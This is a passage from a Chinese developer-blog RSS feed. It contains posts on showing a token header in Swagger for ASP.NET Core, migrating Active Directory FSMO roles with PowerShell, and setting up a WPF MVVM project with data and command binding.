               &lt;strong&gt; c.OperationFilter&lt;/strong&gt;&lt;/span&gt;&lt;strong&gt;&amp;lt;AddAuthTokenHeaderParameter&amp;gt;&lt;/strong&gt;&lt;span&gt;&lt;strong&gt;();&lt;/strong&gt;
            });
            services.AddMvcCore().AddApiExplorer();
        }&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;40&quot;&gt;
&lt;pre&gt;
    &lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; AddAuthTokenHeaderParameter : IOperationFilter
    {

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; Apply(Operation operation, OperationFilterContext context)
        {

            &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (operation.Parameters == &lt;span&gt;null&lt;/span&gt;&lt;span&gt;)
            {
                operation.Parameters &lt;/span&gt;= &lt;span&gt;new&lt;/span&gt; List&amp;lt;IParameter&amp;gt;&lt;span&gt;();
            }
            operation.Parameters.Add(&lt;/span&gt;&lt;span&gt;new&lt;/span&gt;&lt;span&gt; NonBodyParameter()
            {
                Name &lt;/span&gt;= &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;token&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;,
                In &lt;/span&gt;= &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;header&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;,
                Type &lt;/span&gt;= &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;string&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;,
                Description &lt;/span&gt;= &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;token认证信息&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;,
                Required &lt;/span&gt;= &lt;span&gt;true&lt;/span&gt;&lt;span&gt;
            });
        }
    }&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;我们在ConfigureServices添加了OperationFilter&amp;lt;AddAuthTokenHeaderParameter&amp;gt;()，通过这种方式我们可以在swagger中显示token的header，并且进行调试（如图所示），AddAuthTokenHeaderParameter 的apply的属性context中带了controller以及action的各种信息，可以配合实际情况使用&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/465472/201802/465472-20180222204526881-1398903459.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;

&lt;p&gt; &lt;strong&gt;四、与其他API管理工具结合&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;　　swagger强大的功能以及社区的力量，目前很多的API管理工具都支持YApi，目前我们使用的是由去哪儿开源的&lt;a href=&quot;http://yapi.demo.qunar.com/&quot; target=&quot;_blank&quot;&gt;YApi&lt;/a&gt;，从图中可以看到YApi支持导入swagger生成的JSON文件，除该工具 之外&lt;a href=&quot;http://www.doclever.cn/controller/index/index.html&quot; target=&quot;_blank&quot;&gt;DOClever&lt;/a&gt;（开源）也是一个不错的API管理工具，也支持Swagger文件导入（具体工具用法，大家可以去看他们的官网）&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/465472/201802/465472-20180222205100413-1436857553.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;五、总结&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;　　&lt;/strong&gt;Swagger是一个很好的工具，并且在前后端分离开发越来越流行的情况下，在后续的开发过程中，我觉得会扮演着越来越重要的作用，目前我们公司小的项目已经准备开始使用swagger+yapi进行API的管理方式，而这篇文章也是这段时间抽空整理API管理的结果，希望可以帮助到大家，这里可能有很多不足的地方，欢迎大家拍砖，也希望可以跟大家一起进步&lt;/p&gt;

&lt;p&gt;　　&lt;a href=&quot;http://p0myjvpgf.bkt.clouddn.com/WebApplication2.zip&quot; target=&quot;_blank&quot;&gt;demo地址 &lt;/a&gt;&lt;/p&gt;

&lt;p&gt;作者： Mango&lt;/p&gt;
&lt;p&gt;出处： &lt;a href=&quot;http://www.cnblogs.com/OMango/&quot; target=&quot;_blank&quot;&gt;http://www.cnblogs.com/OMango/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;关于自己：专注.Net桌面开发以及Web后台开发，开始接触微服务、docker等互联网相关&lt;/p&gt;
&lt;p&gt;本文版权归作者和博客园共有，欢迎转载，但未经作者同意必须保留此段声明，且在文章页面明显位置给出, &lt;a href=&quot;http://www.cnblogs.com/OMango/p/8460092.html&quot;&gt;原文链接&lt;/a&gt; 如有问题， 可邮件（hongjb@yizit.com）咨询.&lt;/p&gt;



</description>
<pubDate>Thu, 22 Feb 2018 13:00:00 +0000</pubDate>
<dc:creator>OMango</dc:creator>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/OMango/p/8460092.html</dc:identifier>
</item>
<item>
<title>Windows Server 2016-Powershell迁移FSMO角色 - Wenzhongxiang</title>
<link>http://www.cnblogs.com/wenzhongxiang/p/8459926.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/wenzhongxiang/p/8459926.html</guid>
<description>&lt;p&gt;上一章节我们讲到了通过Ntdsutil命令行进行FSMO角色迁移，本章开始之前我们先讨论一下有关FSMO角色放置建议：&lt;/p&gt;
&lt;ul class=&quot; list-paddingleft-2&quot; readability=&quot;3&quot;&gt;&lt;li readability=&quot;0&quot;&gt;
&lt;p&gt;建议将架构主机角色(Schema Master)和域命名主机角色(Domain Naming Master)放在森林根域的GC(全局编录)服务器上；&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;0&quot;&gt;
&lt;p&gt;建议将架构主机角色(Schema Master)和域命名主机角色(Domain Naming Master)放在第一台域控制器上；&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;-1&quot;&gt;
&lt;p&gt;默认Domain Naming Master角色的域控制器必须同时也是GC(全局编录)服务器；&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;-1&quot;&gt;
&lt;p&gt;不建议将Infrastructure Master和GC放在同一台域控制器上；&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;-1&quot;&gt;
&lt;p&gt;一般不建议把PDC Emulator、RID Master及Infrastructure Master放置在GC服务器上;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;但那很多情况下管理员的一般针对单域林的操作方法是基础结构主机可以部署在域中的任意域控制器上，而不管域控制器是否承载了全局编录；针对多域林，如果位于多域林中的指定域没有任何域控制器承载全局编录，则基础结构主机必须部署在一个没有承载全局编录的域控制器上。&lt;/p&gt;
&lt;p&gt;本章我们将介绍通过Powershell进行FSMO角色迁移的方法(记得以管理员身份运行Powershell,如果没有执行权限，记得Set-ExecutionPolicy Unrestricted调整执行权限)，希望以下内容可以帮到大家。&lt;/p&gt;
&lt;p&gt;1、查看当前FSMO角色信息：&lt;/p&gt;
&lt;pre class=&quot;brush:ps;toolbar:false&quot;&gt;
查看林范围操作主机角色：&lt;br/&gt;Get-ADForest azureyun.local |ft SchemaMaster,DomainNamingMaster&lt;br/&gt;查看域范围操作主机角色：&lt;br/&gt;Get-ADDomain azureyun.local |ft InfrastructureMaster,Pdcemulator,RidMaster
&lt;/pre&gt;
&lt;p&gt;2、执行域命名主机角色（Domain Naming Master）、RID 主机角色（RID Master）和基础架构主机角色（Infrastructure Master）迁移，根据提示回车确认：&lt;/p&gt;
&lt;pre class=&quot;brush:ps;toolbar:false&quot;&gt;
Move-ADDirectoryServerOperationMasterRole -Identity Bdc -OperationMasterRole DomainNamingMaster,InfrastructureMaster,RIDMaster -force
&lt;/pre&gt;
&lt;p&gt;3、通过Powershell分别查看林范围跟域范围操作主机角色，确认迁移操作是否成功：&lt;/p&gt;
&lt;pre class=&quot;brush:ps;toolbar:false&quot;&gt;
Get-ADForest azureyun.local |ft SchemaMaster,DomainNamingMaster&lt;br/&gt;Get-ADDomain azureyun.local |ft InfrastructureMaster,Pdcemulator,RidMaster
&lt;/pre&gt;
&lt;p&gt;4、执行架构主机角色（Schema Master）、PDC 模拟主机角色（PDC Emulator）角色迁移，根据提示回车确认：&lt;/p&gt;
&lt;pre class=&quot;brush:ps;toolbar:false&quot;&gt;
Move-ADDirectoryServerOperationMasterRole -Identity Bdc -OperationMasterRole SchemaMaster,PDCEmulator -Force
&lt;/pre&gt;
&lt;p&gt;5、此时我们通过Powershell分别查看林范围跟域范围操作主机角色，发现迁移均已成功：&lt;/p&gt;
&lt;pre class=&quot;brush:ps;toolbar:false&quot;&gt;
Get-ADForest azureyun.local |ft SchemaMaster,DomainNamingMaster&lt;br/&gt;Get-ADDomain azureyun.local |ft InfrastructureMaster,Pdcemulator,RidMaster
&lt;/pre&gt;
&lt;p&gt;附操作实例图如下：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://www.azureyun.com/wp-content/uploads/2018/02/022218_1126_WindowsServ1.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;附快速操作流程：&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;A、查看当前域控制器名称，并确认当前林范围跟域范围操作主机角色信息：&lt;br/&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://www.azureyun.com/wp-content/uploads/2018/02/022218_1126_WindowsServ2.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;B、执行Powershell命令对五个角色进行一次性迁移操作：&lt;br/&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;pre class=&quot;brush:ps;toolbar:false&quot;&gt;
Move-ADDirectoryServerOperationMasterRole -Identity Major -OperationMasterRole SchemaMaster,DomainNamingMaster,PDCEmulator,InfrastructureMaster,RIDMaster -force&lt;br/&gt;移动操作主机角色&lt;br/&gt;你要将角色&quot;SchemaMaster&quot;移动到服务器&quot;Major.azureyun.local&quot;中吗?&lt;br/&gt;[Y] 是(Y) [A] 全是(A) [N] 否(N) [L] 全否(L) [S] 暂停(S) [?] 帮助 (默认值为&quot;Y&quot;):&lt;br/&gt;移动操作主机角色&lt;br/&gt;你要将角色&quot;DomainNamingMaster&quot;移动到服务器&quot;Major.azureyun.local&quot;中吗?&lt;br/&gt;[Y] 是(Y) [A] 全是(A) [N] 否(N) [L] 全否(L) [S] 暂停(S) [?] 帮助 (默认值为&quot;Y&quot;):&lt;br/&gt;移动操作主机角色&lt;br/&gt;你要将角色&quot;PDCEmulator&quot;移动到服务器&quot;Major.azureyun.local&quot;中吗? &lt;br/&gt;[Y] 是(Y) [A] 全是(A) [N] 否(N) [L] 全否(L) [S] 暂停(S) [?] 帮助 (默认值为&quot;Y&quot;):&lt;br/&gt;移动操作主机角色&lt;br/&gt;你要将角色&quot;InfrastructureMaster&quot;移动到服务器&quot;Major.azureyun.local&quot;中吗? &lt;br/&gt;[Y] 是(Y) [A] 全是(A) [N] 否(N) [L] 全否(L) [S] 暂停(S) [?] 帮助 (默认值为&quot;Y&quot;):&lt;br/&gt;移动操作主机角色&lt;br/&gt;你要将角色&quot;RIDMaster&quot;移动到服务器&quot;Major.azureyun.local&quot;中吗? &lt;br/&gt;[Y] 是(Y) [A] 全是(A) [N] 否(N) [L] 全否(L) [S] 暂停(S) [?] 帮助 (默认值为&quot;Y&quot;):&lt;br/&gt;PS C:\&amp;gt;
&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;http://www.azureyun.com/wp-content/uploads/2018/02/022218_1126_WindowsServ3.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;C、查看当前FSMO角色信息，发现已经迁移成功。&lt;br/&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;pre class=&quot;brush:ps;toolbar:false&quot;&gt;
PS C:\&amp;gt; Get-ADForest azureyun.local |ft SchemaMaster,DomainNamingMaster&lt;br/&gt;SchemaMaster DomainNamingMaster&lt;br/&gt;------------ ------------------&lt;br/&gt;Major.azureyun.local Major.azureyun.local&lt;br/&gt;PS C:\&amp;gt; Get-ADDomain azureyun.local |ft InfrastructureMaster,Pdcemulator,RidMaster&lt;br/&gt;InfrastructureMaster Pdcemulator RidMaster&lt;br/&gt;-------------------- ----------- ---------&lt;br/&gt;Major.azureyun.local Major.azureyun.local Major.azureyun.local
&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;http://www.azureyun.com/wp-content/uploads/2018/02/022218_1126_WindowsServ4.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;通过图形化、Ntdsutil命令行及Powershell命令三种方法进行FSMO角色迁移，我们发现还是通过Powershell进行迁移操作更简单更快捷，希望可以帮到大家。&lt;/p&gt;

</description>
<pubDate>Thu, 22 Feb 2018 11:44:00 +0000</pubDate>
<dc:creator>Wenzhongxiang</dc:creator>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/wenzhongxiang/p/8459926.html</dc:identifier>
</item>
<item>
<title>WPF项目学习.一 - 叶耶①</title>
<link>http://www.cnblogs.com/yjwlogs/p/8459751.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/yjwlogs/p/8459751.html</guid>
<description>&lt;p&gt;&lt;span&gt;版权声明：本文为博主初学经验，未经博主允许不得转载。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;一、前言&lt;/p&gt;
&lt;p&gt; 　　记录在学习与制作WPF过程中遇到的解决方案。&lt;/p&gt;
&lt;p&gt;　　 使用MVVM的优点是 数据和视图分离，双向绑定，低耦合，可重用行，相对独立的设计和逻辑；&lt;/p&gt;

&lt;p&gt;二、配置&lt;/p&gt;
&lt;blockquote readability=&quot;7&quot;&gt;
&lt;p&gt;&lt;code&gt;系统环境：&lt;/code&gt;&lt;code&gt;win10&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;开发工具：&lt;/code&gt;&lt;code&gt;Visual Studio 2017&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;开发语言：&lt;/code&gt;&lt;code&gt;C#.WPF (MVVM框架)&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;数据库：&lt;/code&gt;&lt;code&gt;SQLiteStudio&lt;/code&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;三、附件&lt;/p&gt;
&lt;p&gt;四、步骤&lt;/p&gt;
&lt;p&gt;　　1. 创建项目；&lt;/p&gt;
&lt;p&gt;　　　　&lt;img src=&quot;https://images2018.cnblogs.com/blog/1317220/201802/1317220-20180222151927043-1107087308.gif&quot; alt=&quot;&quot; width=&quot;800&quot;/&gt;&lt;/p&gt;
&lt;p&gt;　　2. 文件夹层级；&lt;/p&gt;
&lt;p&gt;　　　　建文件夹：Model，ViewModel，View，Resources，Lib，Service，Common；&lt;/p&gt;
&lt;p&gt;　　　　Model是模型层，属性类存放的地方；也就是存放不涉及业务逻辑的代码；&lt;/p&gt;
&lt;p&gt;　　　　　　例如：列表元素，接口参数，枚举，数据交互的参数模型和View基础元素属性等等；&lt;/p&gt;
&lt;p&gt;　　　　ViewMode是视图模型层，是MVVM实现业务逻辑代码的地方；&lt;/p&gt;
&lt;p&gt;　　　　　　例如：操作视图界面数据的呈现，界面按钮触发的事件和操作数据库前后对界面交互的事件；&lt;/p&gt;
&lt;p&gt;　　　　View是视图层，是窗体布局实现的地方；也就是呈现给用户交互使用的界面窗体；&lt;/p&gt;
&lt;p&gt;　　　　　　例如：登录页面，查询页面，新增和编辑的页面等；&lt;/p&gt;
&lt;p&gt;　　　　Resources是资源库层，里面存放声音，图片和样式布局等统一调用外部资源的地方；&lt;/p&gt;
&lt;p&gt;　　　　Lib是引用层，放置一些第三方引用便于调用，也可以用nuget统一管理第三方dll；&lt;/p&gt;
&lt;p&gt;　　　　Service是服务层，是实现对数据库或者对站点接口的操作，进行数据持久化和数据交互；&lt;/p&gt;
&lt;p&gt;　　　　Common是工具层，是存放一些公共的代码，统一调用，简洁业务逻辑代码的冗余；&lt;/p&gt;
&lt;p&gt;　　　　注：可以建文件夹，但更推荐新建类库放置以上层级；&lt;/p&gt;
&lt;p&gt;　　　　&lt;img src=&quot;https://images2018.cnblogs.com/blog/1317220/201802/1317220-20180222152442267-764166493.gif&quot; alt=&quot;&quot; width=&quot;500&quot;/&gt;&lt;/p&gt;
&lt;p&gt;　　3. 控件的使用与布局；&lt;/p&gt;
&lt;p&gt;　　　　3.1 从工具箱中直接拖拉控件；&lt;/p&gt;
&lt;p&gt;　　　　　　&lt;img src=&quot;https://images2018.cnblogs.com/blog/1317220/201802/1317220-20180222162606178-890168207.gif&quot; alt=&quot;&quot; width=&quot;500&quot;/&gt;&lt;/p&gt;
&lt;p&gt;　　　　3.2 直接在代码中编辑控件代码；&lt;/p&gt;
&lt;p&gt;　　　　　　&lt;img src=&quot;https://images2018.cnblogs.com/blog/1317220/201802/1317220-20180222163603467-1715006124.gif&quot; alt=&quot;&quot; width=&quot;500&quot;/&gt;&lt;/p&gt;
&lt;p&gt;　　4. 代码关联；&lt;/p&gt;
&lt;p&gt;　　　　4.1 View与ViewModel的交互关联：&lt;/p&gt;
&lt;p&gt;　　　　　　- View后台的代码关联&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33&quot;&gt;
&lt;pre&gt;
&lt;span&gt;　　　　　public&lt;/span&gt; MainWindow() &lt;span&gt;//&lt;/span&gt;&lt;span&gt;类名&lt;/span&gt;
&lt;span&gt;        {
            InitializeComponent();
            DataContext &lt;/span&gt;= &lt;span&gt;new&lt;/span&gt;&lt;span&gt; MainWindowViewModel();//后台代码有这句就实现了View和ViewModel的绑定&lt;/span&gt;&lt;br/&gt;　　　　　}
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;　　　　　　- 文本的绑定 &lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;39&quot;&gt;
&lt;pre&gt;
　　　　　前端：&amp;lt;TextBox Text=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;{Binding TxtInput}&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;/&amp;gt;&lt;br/&gt;　　　　　后端：
&lt;/pre&gt;
&lt;p&gt;　　　　　　　　public string TxtInput&lt;br/&gt;　　　　　　　　{&lt;br/&gt;　　　　　　　　　　get =&amp;gt; _txtInput;&lt;br/&gt;　　　　　　　　　　set&lt;br/&gt;　　　　　　　　　　{&lt;br/&gt;　　　　　　　　　　　　_txtInput = value;&lt;br/&gt;　　　　　　　　　　　　RaisePropertyChanged(&quot;TxtInput&quot;); //用于刷新绑定的输入框&lt;br/&gt;　　　　　　　　　　}&lt;br/&gt;　　　　　　　　}&lt;/p&gt;
&lt;p&gt;　　　　　　　　private string _txtInput;&lt;/p&gt;
&lt;/div&gt;

&lt;p&gt;　　　　　　- 事件的绑定&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;41&quot;&gt;
&lt;pre&gt;
　　　　　前端：&amp;lt;Button Content=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;添加&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt; Command=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;{Binding BtnAddContent}&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;/&amp;gt;&lt;br/&gt;　　　　　后端：
&lt;/pre&gt;
&lt;p&gt;　　　　　　　　public MainWindowViewModel() &lt;br/&gt;　　　　　　　　{&lt;br/&gt;　　　　　　　　　　BtnAddContent = new RelayCommand(AddContent);&lt;br/&gt;　　　　　　　　}&lt;/p&gt;
&lt;p&gt;　　　　　　　　public RelayCommand BtnAddContent { get; set; }&lt;/p&gt;
&lt;p&gt;　　　　　　　　private void AddContent()&lt;br/&gt;　　　　　　　　{&lt;br/&gt; 　　　　　　　　　　//按钮事件处理的业务逻辑代码&lt;br/&gt;　　　　　　　　}&lt;/p&gt;
&lt;/div&gt;

&lt;p&gt;　　　　　　- 样式的绑定&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33&quot;&gt;
&lt;pre&gt;
　　　　　　&amp;lt;TextBox Style=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;{StaticResource TxbTrigger}&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt; Tag=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;序号...&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt; /&amp;gt;

　　　　　　&amp;lt;Button Content=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;添加&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt; Template=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;{StaticResource DefaultButton}&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt; /&amp;gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;”TxbTrigger是输入框水印样式资源，DefaultButton是按钮样式资源模板；详细样式代码，查阅源码中的Resources-Style;“&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/1317220/201802/1317220-20180222165841075-1414435783.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;　　　　4.2 数据绑定和命令绑定的代码&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;36&quot;&gt;
&lt;pre&gt;
&lt;span&gt;　　public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; ViewModelBase : INotifyPropertyChanged
    {
        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;event&lt;/span&gt;&lt;span&gt; PropertyChangedEventHandler PropertyChanged;
        &lt;/span&gt;&lt;span&gt;protected&lt;/span&gt; &lt;span&gt;void&lt;/span&gt; RaisePropertyChanged&amp;lt;T&amp;gt;(Expression&amp;lt;Func&amp;lt;T&amp;gt;&amp;gt;&lt;span&gt; action)
        {
            &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; propertyName =&lt;span&gt; GetPropertyName(action);
            RaisePropertyChanged(propertyName);
        }
        &lt;/span&gt;&lt;span&gt;private&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; &lt;span&gt;string&lt;/span&gt; GetPropertyName&amp;lt;T&amp;gt;(Expression&amp;lt;Func&amp;lt;T&amp;gt;&amp;gt;&lt;span&gt; action)
        {
            &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; expression =&lt;span&gt; (MemberExpression)action.Body;
            &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; propertyName =&lt;span&gt; expression.Member.Name;
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; propertyName;
        }
        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt; RaisePropertyChanged(&lt;span&gt;string&lt;/span&gt;&lt;span&gt; propertyName)
        {
            &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (PropertyChanged != &lt;span&gt;null&lt;/span&gt;&lt;span&gt;)
                PropertyChanged(&lt;/span&gt;&lt;span&gt;this&lt;/span&gt;, &lt;span&gt;new&lt;/span&gt;&lt;span&gt; PropertyChangedEventArgs(propertyName));
        }
    }&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;38&quot;&gt;
&lt;pre&gt;
&lt;span&gt;　　public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; RelayCommand : ICommand
    {
        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; Action ExecuteAction; &lt;span&gt;//&lt;/span&gt;&lt;span&gt;执行方法&lt;/span&gt;
        &lt;span&gt;public&lt;/span&gt; Action&amp;lt;&lt;span&gt;object&lt;/span&gt;&amp;gt; ExecuteCommand; &lt;span&gt;//&lt;/span&gt;&lt;span&gt;执行方法 带参数&lt;/span&gt;
        &lt;span&gt;public&lt;/span&gt; Func&amp;lt;&lt;span&gt;object&lt;/span&gt;, &lt;span&gt;bool&lt;/span&gt;&amp;gt; CanExecuteCommand; &lt;span&gt;//&lt;/span&gt;&lt;span&gt;执行方法的条件&lt;/span&gt;
        &lt;span&gt;public&lt;/span&gt; RelayCommand(Action action)&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 执行事件&lt;/span&gt;
&lt;span&gt;        {
            ExecuteAction &lt;/span&gt;=&lt;span&gt; action;
        }
        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; RelayCommand(Action&amp;lt;&lt;span&gt;object&lt;/span&gt;&amp;gt; action)&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 执行带参数的事件&lt;/span&gt;
&lt;span&gt;        {
            ExecuteCommand &lt;/span&gt;=&lt;span&gt; action;
        }
        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; RelayCommand(Action&amp;lt;&lt;span&gt;object&lt;/span&gt;&amp;gt; action, Func&amp;lt;&lt;span&gt;object&lt;/span&gt;, &lt;span&gt;bool&lt;/span&gt;&amp;gt; can)&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 根据条件执行带参数的事件&lt;/span&gt;
&lt;span&gt;        {
            ExecuteCommand &lt;/span&gt;=&lt;span&gt; action;
            CanExecuteCommand &lt;/span&gt;=&lt;span&gt; can;
        }
        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;event&lt;/span&gt; EventHandler CanExecuteChanged;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 当命令可执行状态发生改变时，应当被激发&lt;/span&gt;
        &lt;span&gt;public&lt;/span&gt; &lt;span&gt;bool&lt;/span&gt; CanExecute(&lt;span&gt;object&lt;/span&gt; parameter)&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 用于判断命令是否可以执行&lt;/span&gt;
&lt;span&gt;        {
            &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (ExecuteAction != &lt;span&gt;null&lt;/span&gt;) &lt;span&gt;return&lt;/span&gt; &lt;span&gt;true&lt;/span&gt;&lt;span&gt;;
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; CanExecuteCommand == &lt;span&gt;null&lt;/span&gt; ||&lt;span&gt; CanExecuteCommand(parameter);
        }
        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt; Execute(&lt;span&gt;object&lt;/span&gt; parameter)&lt;span&gt;//&lt;/span&gt;&lt;span&gt;命令执行&lt;/span&gt;
&lt;span&gt;        {
            &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (ExecuteCommand != &lt;span&gt;null&lt;/span&gt;&lt;span&gt;) ExecuteCommand(parameter);
            &lt;/span&gt;&lt;span&gt;else&lt;/span&gt;&lt;span&gt; ExecuteAction();
        }
    }&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;ViewModel的业务类需要继承ViewModelBase&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
&lt;span&gt;　　public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt; MainWindowViewModel : ViewModelBase
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;前端的DataGrid绑定的数据需要用ObservableCollection类型定义列表；&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;34&quot;&gt;
&lt;pre&gt;
&lt;span&gt;　　　　　public&lt;/span&gt; ObservableCollection&amp;lt;AddModel&amp;gt;&lt;span&gt; AddContent
        {
            &lt;/span&gt;&lt;span&gt;get&lt;/span&gt; =&amp;gt;&lt;span&gt; _addContent;
            &lt;/span&gt;&lt;span&gt;set&lt;/span&gt;&lt;span&gt;
            {
                _addContent &lt;/span&gt;=&lt;span&gt; value;
                RaisePropertyChanged(&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;AddContent&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;); 
&lt;span&gt;            }
        }

        &lt;/span&gt;&lt;span&gt;private&lt;/span&gt; ObservableCollection&amp;lt;AddModel&amp;gt; _addContent = &lt;span&gt;new&lt;/span&gt; ObservableCollection&amp;lt;AddModel&amp;gt;();
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&quot;AddModel&quot;是Model中的属性类；代表DataGrid中绑定的列名指向；&lt;/p&gt;
&lt;p&gt;DataGrid前端代码:&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;39&quot;&gt;
&lt;pre&gt;
&amp;lt;DataGrid AutoGenerateColumns=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;False&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt; x:Name&lt;/span&gt;=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;DgTimes&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt; ItemsSource=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;{Binding AddContent}&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt; 
          SelectedItem&lt;/span&gt;=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;{Binding SelectTime,Mode=TwoWay,UpdateSourceTrigger=PropertyChanged}&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&amp;gt;
            &amp;lt;DataGrid.InputBindings&amp;gt;
